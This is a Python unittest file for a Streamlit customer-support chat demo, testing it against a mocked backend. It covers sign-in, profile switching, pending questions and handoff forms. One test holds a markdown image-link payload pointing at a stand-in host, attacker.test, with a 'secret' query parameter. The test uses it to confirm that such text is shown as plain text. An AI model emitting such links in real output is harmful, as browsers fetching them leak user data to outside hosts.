# Streamlit 1.67.0 AppTest + HTTPX 0.28.1 MockTransport; the real page against a controlled backend.
import json
import unittest
from functools import partial
from pathlib import Path
from unittest import mock
import httpx
from streamlit.testing.v1 import AppTest
import api_client

APP = str(Path(__file__).resolve().parents[1] / 'streamlit_app.py')
TOKEN, PASSWORD = 'server-side-token-xyz', 'demo-password'
CONV_A, CONV_B = '0000000a-0000-4000-8000-00000000000a', '0000000b-0000-4000-8000-00000000000b'
OFFER = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa'
RID = 'ffffffff-ffff-4fff-8fff-ffffffffffff'
BINDING = {'syn-cust-01': {'role': 'customer', 'home_department': None},
           'syn-emp-hr-01': {'role': 'employee', 'home_department': 'hr'}}


class Backend:
    """Controlled FastAPI responses shaped like the real wire contract."""

    def __init__(self):
        self.calls, self.outcome, self.history, self.created = [], None, None, [CONV_A, CONV_B]
        self.handoff_status = 200

    def __call__(self, request):
        body = json.loads(request.content) if request.content else {}
        params = dict(request.url.params)
        user = body.get('user_id') or params.get('user_id')
        self.calls.append((request.method, request.url.path, body or params))
        path = request.url.path
        if path == '/profiles/resolve':
            return httpx.Response(200, json={'request_id': RID, 'user_id': user, 'created': False,
                                             'profile': {'user_id': user, **BINDING[user]}})
        if path == '/conversations' and request.method == 'POST':
            return httpx.Response(200, json={'request_id': RID, 'user_id': user,
                                             'conversation_id': self.created.pop(0)})
        if path == '/conversations':
            return httpx.Response(200, json={'request_id': RID, 'user_id': user, 'conversations': [
                {'conversation_id': CONV_A, 'created_at': '2026-11-21T10:00:00+00:00'}]})
        if path == '/history':
            return httpx.Response(200, json={'request_id': RID, 'user_id': user,
                                             'conversation_id': params['conversation_id'], **self.history})
        if path == '/interactions':
            if self.outcome is None:
                return httpx.Response(503, text='<html>gateway</html>')
            return httpx.Response(200, json={'request_id': RID, 'user_id': user,
                                             'conversation_id': body['conversation_id'], 'outcome': self.outcome})
        if path == '/handoffs':
            return httpx.Response(self.handoff_status, json={'request_id': RID, 'user_id': user,
                'conversation_id': body['conversation_id'], 'submission_id': RID, 'receipt_id': RID,
                'contact_method': 'email', 'simulated': True})
        return httpx.Response(404, json={'error': {'code': 'not_found', 'message': 'x', 'request_id': RID}})

    def count(self, path):
        return sum(1 for _, called, _ in self.calls if called == path)


class AppTests(unittest.TestCase):
    def setUp(self):
        self.backend = Backend()
        patcher = mock.patch.object(api_client, 'Client', partial(api_client.Client,
                                                                   transport=httpx.MockTransport(self.backend)))
        patcher.start()
        self.addCleanup(patcher.stop)

    def app(self, *, configured=True):
        at = AppTest.from_file(APP, default_timeout=10)
        if configured:
            at.secrets['SHOPUNOW_BACKEND_URL'] = 'http://backend.test'
            at.secrets['SHOPUNOW_API_TOKEN'] = TOKEN
            at.secrets['SHOPUNOW_UI_PASSWORD'] = PASSWORD
        return at.run()

    def signed_in(self):
        at = self.app()
        at.text_input(key='password').input(PASSWORD)
        at.button(key='sign_in').click().run()
        return at

    def chat(self, user='syn-cust-01'):
        at = self.signed_in()
        at.selectbox(key='user_id').select(user).run()
        at.button(key='new_conversation').click().run()
        return at

    def rendered(self, at):
        texts = [element.value for kind in ('markdown', 'text', 'info', 'success', 'warning', 'error', 'caption')
                 for element in getattr(at, kind)]
        return '\n'.join(str(text) for text in texts)

    def test_missing_configuration_stops_before_any_control(self):
        # Break caught: the page runs without a backend URL, token or password.
        at = self.app(configured=False)
        self.assertEqual(len(at.selectbox), 0)
        self.assertTrue(at.error)

    def test_the_password_gate_blocks_until_correct_and_the_token_is_never_shown(self):
        # Break caught: controls before sign-in, or the backend token rendered in the page.
        at = self.app()
        at.text_input(key='password').input('wrong')
        at.button(key='sign_in').click().run()
        self.assertEqual(len(at.selectbox), 0)
        self.assertTrue(at.error)
        at.text_input(key='password').input(PASSWORD)
        at.button(key='sign_in').click().run()
        self.assertEqual(len(at.selectbox(key='user_id').options), 9)
        self.assertNotIn(TOKEN, self.rendered(at))
        self.assertEqual(self.backend.calls, [])  # Signing in calls nothing.

    def test_the_demo_notice_is_shown_once_signed_in(self):
        # Break caught (plan D15, owner-approved text): visitors are not told that profiles are shared and that
        # only fictitious contact details belong in the support form.
        notice = 'Demo only: profiles are shared by all visitors. Use fictitious contact details only.'
        self.assertIn(notice, self.rendered(self.signed_in()))
        self.assertIn(notice, self.rendered(self.chat()))  # Still visible where questions and the form are used.

    def test_an_answer_is_shown_with_the_stored_profile_binding(self):
        self.backend.outcome = {'kind': 'answer', 'text': 'Parcels arrive in 3 days.', 'cited_ids': ['k1']}
        at = self.chat()
        at.chat_input(key='question').set_value('When will my parcel arrive?').run()
        page = self.rendered(at)
        self.assertIn('Parcels arrive in 3 days.', page)
        self.assertIn('When will my parcel arrive?', page)
        self.assertIn('customer', page)  # Role comes from the backend's stored binding.
        sent = [body for _, path, body in self.backend.calls if path == '/interactions'][0]
        self.assertEqual(sent['conversation_id'], CONV_A)

    def test_answer_and_question_text_are_shown_as_plain_text_never_markdown(self):
        # Break caught (security review 2026-11-21): model or stored text rendered as markdown, so an
        # image link like ![](https://attacker.test/?d=...) makes the browser fetch an external URL.
        payload = '![x](https://attacker.test/leak?d=secret) [click](https://attacker.test)'
        self.backend.outcome = {'kind': 'answer', 'text': payload, 'cited_ids': []}
        at = self.chat()
        at.chat_input(key='question').set_value(payload).run()
        self.assertFalse(any('attacker.test' in str(element.value) for element in at.markdown))
        self.assertEqual(sum(payload == element.value for element in at.text), 2)

    def test_switching_profile_hides_the_earlier_answer_and_conversation(self):
        # Break caught: one profile's answer or receipt shown under another profile (LLD §2).
        self.backend.outcome = {'kind': 'answer', 'text': 'Private answer for customer one.', 'cited_ids': []}
        at = self.chat()
        at.chat_input(key='question').set_value('Question?').run()
        at.selectbox(key='user_id').select('syn-emp-hr-01').run()
        self.assertNotIn('Private answer for customer one.', self.rendered(at))
        self.assertIsNone(at.session_state['conversation_id'])

    def test_starting_another_conversation_hides_the_earlier_conversations_answer(self):
        # Break caught: results bound to conversation A rendered while conversation B is selected.
        self.backend.outcome = {'kind': 'answer', 'text': 'Answer in conversation A.', 'cited_ids': []}
        at = self.chat()
        at.chat_input(key='question').set_value('Question?').run()
        self.assertIn('Answer in conversation A.', self.rendered(at))
        at.button(key='new_conversation').click().run()
        self.assertEqual(at.session_state['conversation_id'], CONV_B)
        self.assertNotIn('Answer in conversation A.', self.rendered(at))

    def test_an_answer_finished_after_an_interrupted_run_is_shown_on_the_next_run(self):
        # Break caught (challenger D3): a click during a waiting question restarts the page and the
        # answer is never added, so the user asks again.
        from concurrent.futures import Future
        at = self.chat()
        done = Future()
        done.set_result(api_client.Result(True, body={'request_id': RID, 'user_id': 'syn-cust-01',
            'conversation_id': CONV_A, 'outcome': {'kind': 'answer', 'text': 'Late but kept.', 'cited_ids': []}}))
        at.session_state['pending'] = {'sel': ('syn-cust-01', CONV_A, at.session_state['generation']),
                                       'future': done}
        at.run()
        self.assertIn('Late but kept.', self.rendered(at))
        self.assertIsNone(at.session_state['pending'])

    def test_no_response_style_can_be_chosen_and_questions_use_the_evaluated_path(self):
        # Break caught (owner decision 2026-11-23): a style control that makes every answer end in a technical
        # failure, or a question sent with a style the evaluation never covered.
        at = self.chat()
        self.assertEqual([w for w in at.button_group if w.label == 'Response style'], [])
        self.assertNotIn('Response style', self.rendered(at))
        self.backend.outcome = {'kind': 'answer', 'text': 'Plain answer.', 'cited_ids': []}
        at.chat_input(key='question').set_value('Question?').run()
        sent = [body for method, path, body in self.backend.calls if path == '/interactions']
        self.assertEqual(len(sent), 1)
        self.assertNotIn('response_style', sent[0])

    def test_each_question_result_shows_its_processing_time(self):
        # Break caught (owner request 2026-11-23): the user cannot see how long a question took, for an answer
        # as well as for a failed or uncertain result.
        import re
        at = self.chat()
        self.backend.outcome = {'kind': 'answer', 'text': 'Timed answer.', 'cited_ids': []}
        at.chat_input(key='question').set_value('First?').run()
        self.assertEqual(len(re.findall(r'Processed in \d+\.\d s', self.rendered(at))), 1)
        self.backend.outcome = None  # The controlled backend answers 503: an uncertain result.
        at.chat_input(key='question').set_value('Second?').run()
        self.assertEqual(len(re.findall(r'Processed in \d+\.\d s', self.rendered(at))), 2)

    def test_a_still_running_question_shows_the_notice_and_blocks_a_second_question(self):
        # Break caught: after an interrupted run the user sees nothing and can send a duplicate question.
        from concurrent.futures import Future
        at = self.chat()
        at.session_state['pending'] = {'sel': ('syn-cust-01', CONV_A, at.session_state['generation']),
                                       'future': Future()}
        at.run()
        self.assertIn('Still working on your question', self.rendered(at))
        self.assertTrue(at.chat_input(key='question').disabled)

    def test_a_question_running_for_another_conversation_explains_the_disabled_input(self):
        # Break caught: after a switch the input is disabled with no reason, and the earlier answer leaks.
        from concurrent.futures import Future
        at = self.chat()
        at.session_state['pending'] = {'sel': ('syn-cust-01', 'other-conversation', 0), 'future': Future()}
        at.run()
        page = self.rendered(at)
        self.assertNotIn('Still working on your question', page)
        self.assertIn('An earlier question is still finishing', page)
        self.assertTrue(at.chat_input(key='question').disabled)

    def test_an_uncertain_question_is_reported_and_never_resubmitted(self):
        # Break caught: an ambiguous host 503 treated as "not saved", or an automatic retry on rerun.
        at = self.chat()
        at.chat_input(key='question').set_value('Question?').run()
        self.assertIn('may or may not have been saved', self.rendered(at))
        at.run()
        at.run()
        self.assertEqual(self.backend.count('/interactions'), 1)

    def test_an_offer_shows_its_text_and_a_form_that_returns_a_simulated_receipt(self):
        # Break caught: offer without its saved text, a form without a receipt, or a receipt claim of email.
        self.backend.outcome = {'kind': 'handoff_offer', 'offer_id': OFFER,
                                'text': 'Our support team can help with this. You can request a support handoff.'}
        at = self.chat()
        at.chat_input(key='question').set_value('I need a person.').run()
        self.assertIn('Our support team can help with this.', self.rendered(at))
        at.text_input(key=f'name_{OFFER}').input('Sam Synthetic')
        at.text_input(key=f'email_{OFFER}').input('sam@example.test')
        at.button(key=f'FormSubmitter:handoff_{OFFER}-Request support handoff').click().run()
        page = self.rendered(at)
        self.assertIn(RID, page)
        self.assertIn('simulated', page.lower())
        sent = [body for _, path, body in self.backend.calls if path == '/handoffs'][0]
        self.assertEqual((sent['offer_id'], sent['name'], sent['email']), (OFFER, 'Sam Synthetic', 'sam@example.test'))

    def test_a_reopened_conversation_shows_history_and_its_saved_offer_form(self):
        # Break caught: reopen hides notices, or a reopened offer cannot be submitted.
        self.backend.history = {
            'messages': [{'message_id': 'm1', 'request_id': RID, 'sequence': 1, 'speaker': 'user', 'text': 'Old question'},
                         {'message_id': 'm2', 'request_id': RID, 'sequence': 2, 'speaker': 'assistant',
                          'text': 'Our support team can help with this.', 'outcome_kind': 'completed_offer'}],
            'notices': [{'request_id': RID, 'reason_code': 'handoff_needed', 'offer_id': OFFER,
                         'code_owned_text': 'A simulated support offer was saved for this exchange.'}]}
        at = self.signed_in()
        at.selectbox(key='user_id').select('syn-cust-01').run()
        at.button(key='load_conversations').click().run()
        at.selectbox(key='reopen').select(CONV_A).run()
        page = self.rendered(at)
        self.assertIn('Old question', page)
        self.assertIn('Our support team can help with this.', page)
        self.assertTrue(any(element.key == f'name_{OFFER}' for element in at.text_input))

    def test_only_the_newest_handoff_form_is_open_and_older_ones_fold_away(self):
        # Break caught (owner UX 2026-11-24, option 3): every offer keeps a large open form, cluttering the chat,
        # or the newest offer's form is hidden where the user is looking.
        label = 'Request a simulated support handoff'
        offer_two = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb'
        self.backend.outcome = {'kind': 'handoff_offer', 'offer_id': OFFER, 'text': 'First offer.'}
        at = self.chat()
        at.chat_input(key='question').set_value('I need a person.').run()
        self.assertEqual([e.proto.expanded for e in at.expander if e.label == label], [True])
        self.backend.outcome = {'kind': 'handoff_offer', 'offer_id': offer_two, 'text': 'Second offer.'}
        at.chat_input(key='question').set_value('Another person, please.').run()
        self.assertEqual([e.proto.expanded for e in at.expander if e.label == label], [False, True])
        self.assertTrue({f'name_{OFFER}', f'name_{offer_two}'} <= {e.key for e in at.text_input})  # Still usable.

    def test_without_a_conversation_the_page_says_how_to_start_or_reopen_one(self):
        # Break caught (owner UX 2026-11-24): a blank page gives no hint which sidebar button to use.
        at = self.signed_in()
        at.selectbox(key='user_id').select('syn-cust-01').run()
        self.assertIn("Start a new conversation by clicking the 'New conversation' button on the left, or reopen "
                      "an earlier one with 'Load my conversations'.", [element.value for element in at.info])

    def test_each_reopened_offer_sits_beside_the_answer_it_belongs_to(self):
        # Break caught (challenger 2026-11-21): with two offers, both forms appear at the bottom and the user
        # cannot tell which question each belongs to.
        first, second = '11111111-1111-4111-8111-111111111111', '22222222-2222-4222-8222-222222222222'
        offer_two = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb'
        self.backend.history = {
            'messages': [{'message_id': 'm1', 'request_id': first, 'sequence': 1, 'speaker': 'user', 'text': 'Q1'},
                         {'message_id': 'm2', 'request_id': first, 'sequence': 2, 'speaker': 'assistant',
                          'text': 'A1', 'outcome_kind': 'completed_offer'},
                         {'message_id': 'm3', 'request_id': second, 'sequence': 3, 'speaker': 'user', 'text': 'Q2'},
                         {'message_id': 'm4', 'request_id': second, 'sequence': 4, 'speaker': 'assistant',
                          'text': 'A2', 'outcome_kind': 'completed_offer'}],
            'notices': [{'request_id': first, 'reason_code': 'handoff_needed', 'offer_id': OFFER,
                         'code_owned_text': 'Offer one.'},
                        {'request_id': second, 'reason_code': 'handoff_needed', 'offer_id': offer_two,
                         'code_owned_text': 'Offer two.'},
                        {'request_id': RID, 'reason_code': 'technical_error', 'offer_id': None,
                         'code_owned_text': 'The operation failed.'}]}
        at = self.signed_in()
        at.selectbox(key='user_id').select('syn-cust-01').run()
        at.button(key='load_conversations').click().run()
        at.selectbox(key='reopen').select(CONV_A).run()
        order = [row['text'] for row in at.session_state['transcript']]
        self.assertEqual(order, ['Q1', 'A1', 'Offer one.', 'Q2', 'A2', 'Offer two.', 'The operation failed.'])
        self.assertTrue({f'name_{OFFER}', f'name_{offer_two}'} <= {element.key for element in at.text_input})
        self.assertEqual([e.proto.expanded for e in at.expander], [False, True])  # Reopened: newest form open.


if __name__ == '__main__':
    unittest.main()
